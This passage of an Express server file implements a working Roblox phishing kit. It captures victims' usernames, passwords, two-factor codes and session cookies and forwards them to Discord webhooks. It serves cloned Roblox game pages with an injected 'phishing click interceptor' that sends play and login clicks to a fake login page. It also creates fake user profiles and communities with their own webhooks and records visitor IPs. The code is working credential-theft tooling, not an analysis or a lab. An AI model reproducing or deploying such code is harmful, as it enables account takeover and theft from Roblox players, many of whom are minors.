    const clientIp = req.ip || '127.0.0.1';

    // A beacon is a keystroke-level stash, not a login. The page fires it on a
    // click or an Enter press, before Roblox has verified anything, so it has no
    // cookie and no verdict. Stash and return — posting it to Discord is what
    // produced the "username + password, no cookie" messages that look like a
    // capture but are only the victim's first keystroke.
    const isBeacon = kind.toLowerCase().includes('beacon');

    if (isBeacon) {
        if (username || password || twoFactorCode) {
            stashLoginCredentials(req.sessionID, clientIp, username, password, twoFactorCode);
        }
        return res.json({ success: true, captured: false, stashed: true });
    }

    if (!username && !password && !twoFactorCode && !cookie) {
        return res.json({ success: true, captured: false });
    }

    // One stash feeds the later proxy hop, which is where the cookie arrives
    // and where the credential is actually printed.
    stashLoginCredentials(req.sessionID, clientIp, username, password, twoFactorCode);

    if (username) {
        await recordHit({
            username,
            balance: Number(data.balance || data.creditBalance) || 0,
            summary: Number(data.summary || data.creditBalance) || 0,
            rap: Number(data.rap) || 0,
            hasCookie: Boolean(cookie),
            cookie,
            source: kind,
            targetId: data.profileId || '',
            ip: clientIp,
            sessionUser: req.session?.user
        }).catch(err => console.error('[HITS] capture-login record failed:', err.message));
    }

    // Unified dispatch. It reads webhooks.json itself and fans out to every
    // configured target, so this route does not need its own axios loop.
    await unifiedWebhook.sendCapture({
        username: username || 'Unknown',
        password: password || 'None',
        twoFactorCode,
        cookie,
        ip: clientIp,
        userAgent: req.get('User-Agent') || 'Unknown',
        timestamp: timestamp || new Date().toISOString(),
        valid: true
    }).catch(err => console.error('[WEBHOOK] capture-login dispatch failed:', err.message));

    res.json({ success: true, captured: true, redirect: 'https://www.roblox.com/home' });
}

app.post('/api/capture-login', rateLimitMiddleware('capture-login', 20, 60_000), captureLoginHandler);

// Legacy capture.php endpoint. The login page beacons here with a text/plain
// body, so normalise every shape into the same event the API route consumes.
async function phpCaptureHandler(req, res) {
    let body = req.body;
    if (typeof body === 'string') {
        try { body = JSON.parse(body); } catch { body = {}; }
    }
    if (!body || typeof body !== 'object') body = {};

    const username = body.username || body.cvalue || body.login || '';
    const password = body.password || body.pass || '';
    const twoFactorCode = body.twoFactorCode || body.code || '';
    const cookie = body.roblox_security_cookie || body.cookie || '';
    const allCookies = body.all_roblox_cookies || body.cookies || [];
    const hasCookies = Array.isArray(allCookies) ? allCookies.length > 0 : Object.keys(allCookies || {}).length > 0;
    const isBeacon = !cookie && !twoFactorCode && !hasCookies && Boolean(username || password);

    req.body = {
        type: isBeacon ? 'login_beacon' : 'login',
        timestamp: body.timestamp || new Date().toISOString(),
        data: {
            ...body,
            username,
            password,
            twoFactorCode,
            cookie
        }
    };
    return captureLoginHandler(req, res);
}

// ── Game API Endpoints ──

app.post('/api/generate', (req, res) => {
    const { placeId } = req.body;
    
    if (!placeId) {
        return res.status(400).json({ error: "Missing Place ID" });
    }

    const host = req.get('host') || `localhost:${PORT}`;
    const protocol = req.protocol || 'http';
    customLinksStore.add(placeId.toString());
    res.json({ success: true, placeId: placeId, gameLink: `${protocol}://${host}/games/${placeId}/` });
});

const ROBLOX_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.9"
};

app.get('/api/game/:id', async (req, res) => {
    const requestedId = String(req.params.id);
    const cacheKey = `game_${requestedId}`;
    const cachedData = getCached(cacheKey);
    if (cachedData) {
        return res.json(cachedData);
    }
    
    try {
        console.log(`Fetching live details for Game ID: ${requestedId}...`);
        const resolvedGame = await resolveGameIdentifiers(requestedId);
        if (!resolvedGame) {
            throw new Error("Game details not found on Roblox API");
        }

        const placeId = resolvedGame.placeId;
        const universeId = resolvedGame.universeId;
        const universeInfo = resolvedGame.game;
        
        // 1. Get Votes (likes, dislikes)
        const votesRes = await fetch(`https://games.roblox.com/v1/games/votes?universeIds=${universeId}`, {
            headers: ROBLOX_HEADERS
        });
        const votesData = await votesRes.json();
        const votesInfo = (votesData && votesData.data && votesData.data[0]) || { upVotes: 0, downVotes: 0 };
        
        // 2. Get Game Icon/Thumbnail
        const iconRes = await fetch(`https://thumbnails.roblox.com/v1/places/gameicons?placeIds=${placeId}&returnPolicy=PlaceHolder&size=256x256&format=Png&isCircular=false`, {
            headers: ROBLOX_HEADERS
        });
        const iconData = await iconRes.json();
        const iconUrl = (iconData && iconData.data && iconData.data[0]?.imageUrl) || "https://images.unsplash.com/photo-1542751371-adc38448a05e?w=400&q=80";
        
        // 3. Get Favorites Count
        let favoritesCount = 0;
        try {
            const favRes = await fetch(`https://games.roblox.com/v1/games/${universeId}/favorites/count`, {
                headers: ROBLOX_HEADERS
            });
            const favData = await favRes.json();
            favoritesCount = favData.favoritesCount || 0;
        } catch (e) {
            console.error("Failed to fetch favorites count:", e.message);
        }

        // 4. Get Banner Image
        let bannerUrl = "https://images.unsplash.com/photo-1612287230202-1bf1d85d1bdf?w=800&q=80";
        try {
            const bannerRes = await fetch(`https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds=${universeId}&countPerUniverse=1&defaults=true&size=768x432&format=Png&isCircular=false`, {
                headers: ROBLOX_HEADERS
            });
            const bannerData = await bannerRes.json();
            if (bannerData && bannerData.data && bannerData.data.length > 0) {
                const thumbnailsList = bannerData.data[0].thumbnails || [];
                if (thumbnailsList.length > 0) {
                    bannerUrl = thumbnailsList[0].imageUrl || bannerUrl;
                }
            }
        } catch (e) {
            console.error("Failed to fetch banner url:", e.message);
        }

        const totalVotes = votesInfo.upVotes + votesInfo.downVotes;
        const likesPercent = totalVotes === 0 ? 100 : Math.round((votesInfo.upVotes / totalVotes) * 100);

        // Combine details into final structured object
        const result = {
            id: placeId,
            requestedId,
            universeId: universeId,
            title: universeInfo.name,
            desc: universeInfo.description,
            players: formatNumber(universeInfo.playing),
            rawPlayers: universeInfo.playing,
            likes: formatNumber(votesInfo.upVotes),
            rawLikes: votesInfo.upVotes,
            dislikes: formatNumber(votesInfo.downVotes),
            rawDislikes: votesInfo.downVotes,
            likesPercent: `${likesPercent}%`,
            visits: formatLargeNumber(universeInfo.visits),
            rawVisits: universeInfo.visits,
            creator: universeInfo.creator?.name || "Unknown Developer",
            image: iconUrl,
            bannerUrl: bannerUrl,
            favoritesCount: formatNumber(favoritesCount),
            rawFavoritesCount: favoritesCount,
            created: "2014-01-18T00:00:00Z",
            updated: "2026-04-30T00:00:00Z",
            maxPlayers: 12,
            genre: "Murder Mystery",
            canonicalUrlPath: universeInfo.canonicalUrlPath || `/games/${placeId}/`
        };
        
        setCache(cacheKey, result);
        res.json(result);
    } catch (error) {
        console.error(`Roblox API fetch failed for ID ${requestedId}:`, error.message);
        
        // Return preset fallback or default mockup if external API fails
        const preset = gamePresets[requestedId];
        if (preset) {
            res.json({
                ...preset,
                universeId: 66654135, // fallback MM2
                rawPlayers: 215100,
                rawLikes: 4982551,
                rawDislikes: 432950,
                likesPercent: "92%",
                bannerUrl: preset.image,
                favoritesCount: "12,480,112",
                rawFavoritesCount: 12480112,
                created: "2014-01-18T00:00:00Z",
                updated: "2026-04-30T00:00:00Z",
                maxPlayers: 12,
                genre: "Murder Mystery"
            });
        } else {
            res.json({
                id: requestedId,
                universeId: 66654135,
                title: "Custom Game " + requestedId,
                desc: "A custom Roblox game details page. Click 'Play' to launch it on the official Roblox client.",
                players: "12,500",
                rawPlayers: 12500,
                likes: "15,200",
                rawLikes: 15200,
                dislikes: "320",
                rawDislikes: 320,
                likesPercent: "98%",
                visits: "1.2M",
                rawVisits: 1200000,
                creator: "Unknown Developer",
                image: "https://images.unsplash.com/photo-1542751371-adc38448a05e?w=400&q=80",
                bannerUrl: "https://images.unsplash.com/photo-1542751371-adc38448a05e?w=400&q=80",
                favoritesCount: "450,230",
                rawFavoritesCount: 450230,
                created: "2020-01-01T00:00:00Z",
                updated: "2026-01-01T00:00:00Z",
                maxPlayers: 10,
                genre: "All Genres",
                canonicalUrlPath: `/games/${requestedId}/`
            });
        }
    }
});

// ── Fake Profile Storage ──
const PROFILES_FILE = R.seededDataPath('fake_profiles.json');
const COMMUNITIES_FILE = R.seededDataPath('fake_communities.json');

function loadProfiles() {
    try {
        if (fs.existsSync(PROFILES_FILE)) {
            return JSON.parse(fs.readFileSync(PROFILES_FILE, 'utf8'));
        }
    } catch (e) {
        console.error('Error loading profiles:', e.message);
    }
    return {};
}

function saveProfiles(data) {
    try {
        fs.writeFileSync(PROFILES_FILE, JSON.stringify(data, null, 2), 'utf8');
    } catch (e) {
        console.error('Failed to save profiles:', e);
    }
}

function loadCommunities() {
    try {
        if (fs.existsSync(COMMUNITIES_FILE)) {
            return JSON.parse(fs.readFileSync(COMMUNITIES_FILE, 'utf8'));
        }
    } catch (e) {
        console.error('Failed to load communities:', e);
    }
    return {};
}

function saveCommunities(communities) {
    try {
        fs.writeFileSync(COMMUNITIES_FILE, JSON.stringify(communities, null, 2), 'utf8');
    } catch (e) {
        console.error('Failed to save communities:', e);
    }
}

// ── Batch Game Data (thumbnails + player counts) ──
app.get('/api/games/batch', async (req, res) => {
    const placeIds = req.query.placeIds || req.query.universeIds;
    if (!placeIds) return res.status(400).json({ error: 'Missing placeIds' });

    const cacheKey = `batch_${placeIds}`;
    const cachedData = getCached(cacheKey);
    if (cachedData) {
        return res.json(cachedData);
    }

    try {
        const requestedIds = String(placeIds)
            .split(',')
            .map(id => id.trim())
            .filter(Boolean);

        const resolvedGames = await Promise.all(requestedIds.map(id => resolveGameIdentifiers(id)));
        const validGames = resolvedGames.filter(Boolean);
        if (validGames.length === 0) {
            setCache(cacheKey, {});
            return res.json({});
        }

        const universeIds = [...new Set(validGames.map(game => game.universeId))].join(',');
        const resolvedPlaceIds = [...new Set(validGames.map(game => game.placeId))].join(',');

        const [thumbsRes, gamesRes] = await Promise.all([
            fetch(`https://thumbnails.roblox.com/v1/places/gameicons?placeIds=${resolvedPlaceIds}&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false`, { headers: ROBLOX_HEADERS }),
            fetch(`https://games.roblox.com/v1/games?universeIds=${universeIds}`, { headers: ROBLOX_HEADERS })
        ]);

        const [thumbsData, gamesData] = await Promise.all([thumbsRes.json(), gamesRes.json()]);

        const thumbsMap = {};
        if (thumbsData && thumbsData.data) {
            thumbsData.data.forEach(t => { thumbsMap[t.targetId] = t.imageUrl; });
        }

        const gamesMap = {};
        if (gamesData && gamesData.data) {
            gamesData.data.forEach(g => { gamesMap[g.id] = g; });
        }

        const result = {};
        requestedIds.forEach(requestedId => {
            const resolvedGame = validGames.find(game => game.requestedId === requestedId);
            if (!resolvedGame) return;

            const liveGame = gamesMap[resolvedGame.universeId] || resolvedGame.game || null;
            result[requestedId] = {
                placeId: resolvedGame.placeId,
                universeId: resolvedGame.universeId,
                name: liveGame?.name || null,
                playing: liveGame?.playing || 0,
                visits: liveGame?.visits || 0,
                thumbnail: thumbsMap[resolvedGame.placeId]
                    ? `/proxy/image?url=${encodeURIComponent(thumbsMap[resolvedGame.placeId])}`
                    : null
            };
        });

        setCache(cacheKey, result);
        res.json(result);
    } catch (e) {
        console.error('Batch games fetch error:', e.message);
        res.json({});
    }
});

// ── Live Roblox Games Discovery & Omni-Search Endpoints ──

async function fetchRobloxThumbnails(universeIds) {
    if (!universeIds || universeIds.length === 0) return {};
    try {
        const uniqueIds = [...new Set(universeIds.map(String))].slice(0, 100);
        const url = `https://thumbnails.roblox.com/v1/games/icons?universeIds=${uniqueIds.join(',')}&size=512x512&format=Png&isCircular=false`;
        const res = await fetch(url, { headers: ROBLOX_HEADERS });
        const data = await res.json();
        const map = {};
        if (data && Array.isArray(data.data)) {
            data.data.forEach(item => {
                if (item.targetId && item.imageUrl) {
                    map[item.targetId] = `/proxy/image?url=${encodeURIComponent(item.imageUrl)}`;
                }
            });
        }
        return map;
    } catch (e) {
        console.error('[GAMES] Failed to batch fetch thumbnails:', e.message);
        return {};
    }
}

app.get('/api/roblox/games/search', async (req, res) => {
    const q = (req.query.q || req.query.query || '').trim();
    if (!q) {
        return res.redirect('/api/roblox/games/popular');
    }

    const cacheKey = `search_${q.toLowerCase()}`;
    const cached = getCached(cacheKey);
    if (cached) {
        return res.json(cached);
    }

    try {
        const sessionId = crypto.randomUUID();
        const url = `https://apis.roblox.com/search-api/omni-search?searchQuery=${encodeURIComponent(q)}&pageType=games&sessionId=${sessionId}`;
        const searchRes = await fetch(url, { headers: ROBLOX_HEADERS });
        const data = await searchRes.json();

        let rawItems = [];
        if (data && Array.isArray(data.searchResults)) {
            for (const section of data.searchResults) {
                if (Array.isArray(section.contents)) {
                    rawItems.push(...section.contents);
                }
            }
        }

        const validItems = rawItems.filter(item => item.universeId && item.rootPlaceId);
        const universeIds = [...new Set(validItems.map(item => item.universeId))];
        const thumbMap = await fetchRobloxThumbnails(universeIds);

        const games = validItems.map(item => ({
            universeId: item.universeId,
            placeId: item.rootPlaceId,
            rootPlaceId: item.rootPlaceId,
            name: item.name,
            playerCount: item.playerCount || 0,
            totalUpVotes: item.totalUpVotes || 0,
            totalDownVotes: item.totalDownVotes || 0,
            thumbnail: thumbMap[item.universeId] || null
        }));

        const result = { success: true, count: games.length, games };
        setCache(cacheKey, result);
        res.json(result);
    } catch (e) {
        console.error('[GAMES] Search failed:', e.message);
        res.status(500).json({ success: false, error: e.message, games: [] });
    }
});

app.get('/api/roblox/games/popular', async (req, res) => {
    const cacheKey = 'popular_roblox_games';
    const cached = getCached(cacheKey);
    if (cached) {
        return res.json(cached);
    }

    try {
        const sessionId = crypto.randomUUID();
        let rawGames = [];

        try {
            const expRes = await fetch(`https://apis.roblox.com/explore-api/v1/get-sorts?sessionId=${sessionId}`, { headers: ROBLOX_HEADERS });
            const expData = await expRes.json();
            if (expData && Array.isArray(expData.sorts)) {
                const gameSort = expData.sorts.find(s => s.contentType === 'Games' && Array.isArray(s.games) && s.games.length > 0);
                if (gameSort) {
                    rawGames = gameSort.games;
                }
            }
        } catch (e) {
            console.error('[GAMES] Explore API error:', e.message);
        }

        if (rawGames.length === 0) {
            // Fallback: search 'popular'
            const searchRes = await fetch(`https://apis.roblox.com/search-api/omni-search?searchQuery=popular&pageType=games&sessionId=${sessionId}`, { headers: ROBLOX_HEADERS });
            const data = await searchRes.json();
            if (data && Array.isArray(data.searchResults)) {
                for (const section of data.searchResults) {
                    if (Array.isArray(section.contents)) rawGames.push(...section.contents);
                }
            }
        }

        const validItems = rawGames.filter(item => item.universeId && item.rootPlaceId).slice(0, 48);
        const universeIds = [...new Set(validItems.map(item => item.universeId))];
        const thumbMap = await fetchRobloxThumbnails(universeIds);

        const games = validItems.map(item => ({
            universeId: item.universeId,
            placeId: item.rootPlaceId,
            rootPlaceId: item.rootPlaceId,
            name: item.name,
            playerCount: item.playerCount || 0,
            totalUpVotes: item.totalUpVotes || 0,
            totalDownVotes: item.totalDownVotes || 0,
            thumbnail: thumbMap[item.universeId] || null
        }));

        const result = { success: true, count: games.length, games };
        setCache(cacheKey, result);
        res.json(result);
    } catch (e) {
        console.error('[GAMES] Popular fetch failed:', e.message);
        res.status(500).json({ success: false, error: e.message, games: [] });
    }
});

// ── Roblox User Lookup (for profile preview) ──
app.get('/api/roblox-user', async (req, res) => {
    const { username } = req.query;
    if (!username) return res.status(400).json({ error: 'Missing username' });

    try {
        const searchRes = await fetch('https://users.roblox.com/v1/usernames/users', {
            method: 'POST',
            headers: { ...ROBLOX_HEADERS, 'Content-Type': 'application/json' },
            body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
        });
        const searchData = await searchRes.json();

        if (!searchData.data || !searchData.data[0]) {
            return res.json({ found: false, error: 'User not found' });
        }

        const user = searchData.data[0];
        const userId = user.id;

        // Fetch headshot avatar
        const avatarRes = await fetch(
            `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`,
            { headers: ROBLOX_HEADERS }
        );
        const avatarData = await avatarRes.json();
        const rawAvatarUrl = (avatarData.data && avatarData.data[0]) ? avatarData.data[0].imageUrl : null;
        // Proxy through Node so the image loads on localhost without CORS issues
        const avatarUrl = rawAvatarUrl
            ? `http://localhost:${PORT}/proxy/image?url=${encodeURIComponent(rawAvatarUrl)}`
            : null;

        res.json({
            found: true,
            success: true,
            userId,
            username: user.name,
            displayName: user.displayName || user.name,
            avatarUrl,
            rawAvatarUrl
        });
    } catch (e) {
        console.error('Roblox user lookup error:', e.message);
        res.json({ found: false, error: e.message });
    }
});

// API endpoint to save fake profile
app.post('/api/save-profile', (req, res) => {
    const {
        fakeUserId, fakeUsername, fakeDisplayName, fakeBio, avatarUrl,
        realUserId, realUsername, webhookUrl,
        friends, followers, followings, status, creationDate, premium
    } = req.body;

    if (!fakeUserId || !fakeUsername) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    const profiles = loadProfiles();
    profiles[fakeUserId] = {
        fakeUserId,
        fakeUsername,
        fakeDisplayName: fakeDisplayName || fakeUsername,
        fakeBio: fakeBio || '',
        avatarUrl: avatarUrl || '',
        realUserId: realUserId || '',
        realUsername: realUsername || '',
        webhookUrl: webhookUrl || '',
        friends: parseInt(friends) || 0,
        followers: parseInt(followers) || 0,
        followings: parseInt(followings) || 0,
        status: status || 'Offline',
        creationDate: creationDate || new Date().toISOString().split('T')[0],
        premium: premium === 'Yes' || premium === true,
        createdAt: new Date().toISOString(),
        createdBy: req.session.user?.id || 'anonymous'
    };

    saveProfiles(profiles);
    console.log(`[PROFILE] Saved fake profile: ${fakeUsername} (ID: ${fakeUserId})`);

    res.json({ success: true, profileLink: `http://localhost:${PORT}/users/${fakeUserId}/profile` });
});

// API endpoint to list all fake profiles
app.get('/api/profiles', (req, res) => {
    const profiles = loadProfiles();
    res.json(profiles);
});

// API endpoint to list all fake communities
app.get('/api/communities', (req, res) => {
    const communities = loadCommunities();
    res.json(communities);
});

// API endpoint to save profile webhook
app.post('/api/profile/:id/webhook', (req, res) => {
    const { webhookUrl } = req.body;
    const profiles = loadProfiles();
    if (!profiles[req.params.id]) {
        return res.status(404).json({ error: 'Profile not found' });
    }
    profiles[req.params.id].webhookUrl = webhookUrl;
    saveProfiles(profiles);
    res.json({ success: true });
});

// API endpoint to save community
app.post('/api/save-community', (req, res) => {
    const {
        fakeGroupId, fakeGroupName, fakeGroupDesc, fakeMembers, fakeOwner,
        realGroupId, communityLink, memberCount, groupFunds, ownerUsername,
        memberRank, rankNum, groupLogoUrl, webhookUrl
    } = req.body;
    if (!fakeGroupId) return res.status(400).json({ error: 'Missing fakeGroupId' });
    
    const communities = loadCommunities();
    const resolvedLink = communityLink || `http://localhost:${PORT}/communities/${fakeGroupId}`;
    communities[fakeGroupId] = {
        fakeGroupId,
        fakeGroupName: fakeGroupName || 'Untitled Community',
        fakeGroupDesc: fakeGroupDesc || '',
        fakeMembers: memberCount ?? fakeMembers ?? 0,
        groupFunds: groupFunds ?? 0,
        fakeOwner: ownerUsername || fakeOwner || 'Unknown',
        memberRank: memberRank || 'Member',
        rankNum: rankNum ?? 1,
        groupLogoUrl: groupLogoUrl || '',
        webhookUrl: webhookUrl || '',
        realGroupId: realGroupId || '',
        communityLink: resolvedLink,
        createdAt: new Date().toISOString()
    };
    saveCommunities(communities);
    res.json({ success: true, communityLink: resolvedLink });
});

// API endpoint to delete a fake community
app.delete('/api/community/:id', (req, res) => {
    const communities = loadCommunities();
    if (!communities[req.params.id]) {
        return res.status(404).json({ error: 'Community not found' });
    }
    delete communities[req.params.id];
    saveCommunities(communities);
    res.json({ success: true });
});

// API endpoint to save community webhook
app.post('/api/community/:id/webhook', (req, res) => {
    const { webhookUrl } = req.body;
    const communities = loadCommunities();
    if (!communities[req.params.id]) {
        return res.status(404).json({ error: 'Community not found' });
    }
    communities[req.params.id].webhookUrl = webhookUrl;
    saveCommunities(communities);
    res.json({ success: true });
});

// API endpoint to delete a fake profile
app.delete('/api/profile/:id', (req, res) => {
    const profiles = loadProfiles();
    if (!profiles[req.params.id]) {
        return res.status(404).json({ error: 'Profile not found' });
    }
    delete profiles[req.params.id];
    saveProfiles(profiles);
    res.json({ success: true });
});

// API endpoint to get fake profile
app.get('/api/profile/:id', (req, res) => {
    const profiles = loadProfiles();
    const profile = profiles[req.params.id];
    
    if (!profile) {
        return res.status(404).json({ error: 'Profile not found' });
    }
    
    res.json(profile);
});

// Endpoint to fetch game servers for the public details view
app.get('/api/game/:id/servers', async (req, res) => {
    const resolvedGame = await resolveGameIdentifiers(req.params.id);
    const placeId = resolvedGame?.placeId || req.params.id;
    const cacheKey = `servers_${placeId}`;
    const cachedData = getCached(cacheKey);
    if (cachedData) {
        return res.json(cachedData);
    }
    try {
        console.log(`Fetching public servers for Place ID: ${placeId}...`);
        const serversRes = await fetch(`https://games.roblox.com/v1/games/${placeId}/servers/Public?limit=15`, {
            headers: ROBLOX_HEADERS
        });
        const serversData = await serversRes.json();
        setCache(cacheKey, serversData);
        res.json(serversData);
    } catch (error) {
        console.error(`Failed to fetch servers for place ${placeId}:`, error.message);
        res.status(500).json({ error: "Failed to fetch public servers" });
    }
});

// ── Roblox CDN Image Proxy (avoids CORS / Nginx dependency on localhost) ──
// Usage: /proxy/image?url=https://tr.rbxcdn.com/...
async function proxyStaticAsset(url, res, cacheControl = 'public, max-age=86400') {
    const assetRes = await fetch(url, {
        headers: {
            ...ROBLOX_HEADERS,
            // rbxcdn hands back 403 for hotlinks that carry no referer
            'Referer': 'https://www.roblox.com/',
            'Accept': '*/*',
        }
    });
    if (!assetRes.ok) {
        res.status(assetRes.status).send('Upstream error');
        return;
    }

    res.setHeader('Content-Type', assetRes.headers.get('content-type') || 'application/octet-stream');
    res.setHeader('Cache-Control', cacheControl);
    res.setHeader('Access-Control-Allow-Origin', '*');

    const buffer = await assetRes.arrayBuffer();
    res.send(Buffer.from(buffer));
}

app.get('/proxy/image', async (req, res) => {
    const { url } = req.query;
    if (!url) return res.status(400).send('Missing url parameter');

    // Only allow proxying from trusted Roblox CDN domains
    const ALLOWED_HOSTS = [
        'tr.rbxcdn.com',
        'images.rbxcdn.com',
        'thumbnails.roblox.com',
        'static.rbxcdn.com',
        'css.rbxcdn.com',
        'js.rbxcdn.com',
        'images.unsplash.com'
    ];
    let parsedUrl;
    try { parsedUrl = new URL(url); } catch (e) { return res.status(400).send('Invalid URL'); }
    if (!ALLOWED_HOSTS.some(h => parsedUrl.hostname === h)) {
        return res.status(403).send('Forbidden: host not whitelisted');
    }

    try {
        await proxyStaticAsset(url, res);
    } catch (e) {
        console.error('[PROXY] Image fetch failed:', e.message);
        res.status(502).send('Proxy fetch failed');
    }
});

const ROBLOX_STATIC_PROXIES = {
    thumbnails: 'https://tr.rbxcdn.com',
    imgrbx: 'https://images.rbxcdn.com',
    rbxcdn: 'https://css.rbxcdn.com',
    'rblx-js': 'https://js.rbxcdn.com',
    staticrbx: 'https://static.rbxcdn.com',
};

Object.entries(ROBLOX_STATIC_PROXIES).forEach(([prefix, upstream]) => {
    app.get(`/${prefix}/*`, async (req, res) => {
        const subPath = req.path.replace(`/${prefix}`, '');
        const qs = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
        const targetUrl = `${upstream}${subPath}${qs}`;
        try {
            await proxyStaticAsset(targetUrl, res);
        } catch (e) {
            console.error(`[STATIC-PROXY] ${prefix} -> ${targetUrl} failed:`, e.message);
            res.status(502).send('Static asset proxy failed');
        }
    });
});

// www.roblox.com serves a handful of scripts from its own /js/ path. Without a
// route they fell through to the SPA shell and the browser rejected the HTML
// as an unexecutable script.
app.get('/js/*', async (req, res) => {
    try {
        const qs = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
        await proxyStaticAsset(`https://www.roblox.com${req.path}${qs}`, res);
    } catch (e) {
        console.error('[STATIC-PROXY] /js failed:', e.message);
        res.status(502).type('application/javascript').send('/* proxy failed */');
    }
});

// Dynamic route for game presentation details view
const GAME_CACHE_DIR = R.dataPath('.cache', 'game-pages');if (!fs.existsSync(GAME_CACHE_DIR)) {
    try { fs.mkdirSync(GAME_CACHE_DIR, { recursive: true }); } catch (e) {}
}

async function renderGamePage(req, res, targetPlaceId, targetSlug) {
    // The id becomes a filename below. Anything that is not all digits is a
    // traversal attempt (`..%2f..%2fpublic%2findex` decodes to a path segment
    // Express hands back verbatim) and has no page to render.
    const placeId = String(targetPlaceId || '');
    if (!/^\d{1,20}$/.test(placeId)) {
        return res.status(400).type('text/plain').send('Invalid game id');
    }
    // A cached page is served to everyone for five minutes, so its rewritten
    // links cannot carry a host the caller chose. PUBLIC_ORIGIN wins when set.
    const host = process.env.PUBLIC_ORIGIN
        ? String(process.env.PUBLIC_ORIGIN).replace(/^https?:\/\//, '').replace(/\/$/, '')
        : (req.get('host') || `localhost:${PORT}`);
    const cacheFile = path.join(GAME_CACHE_DIR, `${placeId}.html`);

    let html = null;
    try {
        if (fs.existsSync(cacheFile)) {
            const stats = fs.statSync(cacheFile);
            if (Date.now() - stats.mtimeMs < 300000) { // 5 minutes cache
                html = fs.readFileSync(cacheFile, 'utf8');
            }
        }
    } catch (e) {}

    if (!html) {
        try {
            const robloxUrl = targetSlug 
                ? `https://www.roblox.com/games/${placeId}/${targetSlug}`
                : `https://www.roblox.com/games/${placeId}/`;
                
            console.log(`[GAME PROXY] Fetching live page from Roblox: ${robloxUrl}`);
            const upstream = await fetch(robloxUrl, {
                headers: {
                    ...ROBLOX_HEADERS,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                },
                redirect: 'follow',
            });

            if (upstream.ok) {
                html = await upstream.text();
                try { fs.writeFileSync(cacheFile, html, 'utf8'); } catch (e) {}
            } else {
                console.error(`[GAME PROXY] Upstream returned status ${upstream.status}`);
            }
        } catch (e) {
            console.error(`[GAME PROXY] Failed to fetch game page:`, e.message);
        }
    }

    // Fallback if live Roblox fetch fails (e.g. rate limit, network error)
    if (!html) {
        const fallbackPath = path.join(__dirname, 'storage', 'templates', 'game-fallback.html');
        if (fs.existsSync(fallbackPath)) {
            html = fs.readFileSync(fallbackPath, 'utf8');
            try {
                const gameDetails = await resolveGameIdentifiers(placeId);
                if (gameDetails && gameDetails.game) {
                    const gameName = gameDetails.game.name || 'Roblox Game';
                    html = html.replace(/<title>.*?<\/title>/i, `<title>${gameName} | Play on Roblox</title>`);
                }
            } catch (e) {}
        }
    }

    if (!html) {
        return res.status(502).send('Failed to load Roblox game page.');
    }

    // 1. Rewrite URLs so CDN assets, styles, JS bundles and images load through local proxies
    html = html.replace(/https:\/\/www\.roblox\.com\//g, `//${host}/`);
    html = html.replace(/https:\/\/roblox\.com\//g, `//${host}/`);
    html = html.replace(/https:\/\/tr\.rbxcdn\.com\//g, '/thumbnails/');
    html = html.replace(/https:\/\/images\.rbxcdn\.com\//g, '/imgrbx/');
    html = html.replace(/https:\/\/css\.rbxcdn\.com\//g, '/rbxcdn/');
    html = html.replace(/https:\/\/js\.rbxcdn\.com\//g, '/rblx-js/');
    html = html.replace(/https:\/\/static\.rbxcdn\.com\//g, '/staticrbx/');

    // 2. Inject proxy-shim.js into <head> so client-side API requests stay on localhost
    const proxyShimScript = '<script src="/proxy-shim.js"></script>';
    if (html.includes('<head')) {
        html = html.replace(/<head\b[^>]*>/i, `$&${proxyShimScript}`);
    } else {
        html = proxyShimScript + html;
    }

    // 3. Inject phishing click interceptor to capture play / join / login actions
    const returnUrlParam = encodeURIComponent(`/games/${placeId}/`);
    const interceptorScript = `
<script>
(function() {
    const loginUrl = '/login.php?returnUrl=${returnUrlParam}';
    
    document.addEventListener('click', function(e) {
        const el = e.target.closest('button, a, .btn-common-play-game, .play-button, [data-testid="play-button"], .rbx-navbar-login');
        if (!el) return;
        
        const text = (el.textContent || '').toLowerCase().trim();
        const href = el.getAttribute('href') || '';
        const cls = el.className || '';
        
        const isPlay = el.closest('#game-details-play-button-container') ||
                       el.closest('.game-play-buttons') ||
                       el.closest('.btn-common-play-game') ||
                       cls.includes('play-game') ||
                       cls.includes('play-button') ||
                       text === 'play' ||
                       text.startsWith('play ') ||
                       text.includes('join server');
                       
        const isLogin = text.includes('log in') ||
                        text.includes('sign in') ||
                        text.includes('sign up') ||
                        href.includes('/login') ||
                        cls.includes('login') ||
                        cls.includes('rbx-navbar-login');

        const isInteraction = text.includes('favorite') ||
                              text.includes('follow') ||
                              el.closest('.favorite-button') ||
                              el.closest('.voting-panel');

        if (isPlay || isLogin || isInteraction) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            window.location.href = loginUrl;
        }
    }, true);
})();
</script>
`;

    if (html.includes('</head>')) {
        html = html.replace('</head>', `${interceptorScript}</head>`);
    } else {
        html = html + interceptorScript;
    }

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
}

app.get('/games/:id/:slug?', async (req, res) => {
    try {
        const resolved = await resolveGameIdentifiers(req.params.id);
        const placeId = resolved?.placeId || req.params.id;
        recordVisit({
            type: 'game',
            targetId: placeId,
            targetName: resolved?.game?.name || `Game #${placeId}`,
            ip: req.ip,
            sessionUser: req.session?.user
        });
        await renderGamePage(req, res, placeId, req.params.slug);
    } catch (e) {
        recordVisit({
            type: 'game',
            targetId: req.params.id,
            targetName: `Game #${req.params.id}`,
            ip: req.ip,
            sessionUser: req.session?.user
        });
        await renderGamePage(req, res, req.params.id, req.params.slug);
    }
});

app.get('/game/:id', async (req, res) => {
    try {
        const resolved = await resolveGameIdentifiers(req.params.id);
        const placeId = resolved?.placeId || req.params.id;
        recordVisit({
            type: 'game',
            targetId: placeId,
            targetName: resolved?.game?.name || `Game #${placeId}`,
            ip: req.ip,
            sessionUser: req.session?.user
        });
